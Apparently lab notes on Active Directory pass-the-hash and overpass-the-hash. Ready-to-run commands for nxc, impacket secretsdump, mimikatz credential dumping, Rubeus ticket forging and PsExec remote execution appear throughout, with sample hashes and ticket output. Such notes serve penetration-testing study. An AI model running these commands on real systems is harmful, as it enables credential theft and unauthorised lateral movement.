

# Linux

```
nxc smb 192.168.100.99 -u 'user' -H 'NT_HASH_HERE'
```

dont forget that with impacket usually the syntax stays the same so you just need to change the name before the .py

```
impacket-secretsdump.py 'domain'/'user'@target -hashes ':acfd00282fbe922483c12e049e6e8990'
```

# Windows

[wmiexec](0%20Tools/Connect/wmiexec.md)

This techniques works against Active Directory domain accounts and the built-in local administrator account.

### Overpass the Hash

Provides us with access to a resource with Kerberos authentication using a NTLM hash.

The pretext for this attack involves a user right clicking a file, clicking `Run as different user`, and entering credentials for said user. These credentials are then cached on the machine, and recoverable via `mimikatz`.

```
privilege::debug
sekurlsa::logonpasswords
```

In this example, we reveal the hash `369def79d8372408bf6e93364cc93075` for the user `jen`

The essence of this attack involves turning the NTLM hash into a Kerberos ticket to avoid the use of NTLM authentication. 


# Windows Host

## Mimikatz
We can once again use `mimikatz` for this.

```
sekurlsa::pth /user:jen /domain:<domain_name> /ntlm:<ntlm_hash> /run:powershell
```


## Rubeus (my preferred way)


```
# Ask and inject the ticket to hash
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /sid:<user_sid> /ptt
```



```
PS C:\Windows\system32> net use \\files04
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

We can now see our `net user` command was successful. We have now sucessfully converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.

Although PsExec cannot accept password hashes for remote connections, we can use our generated Kerberos tickets to obtain code executeion on the remote machine we just generated our ticket for as `jen`.

```
.\PsExec.exe \\files04 cmd
```
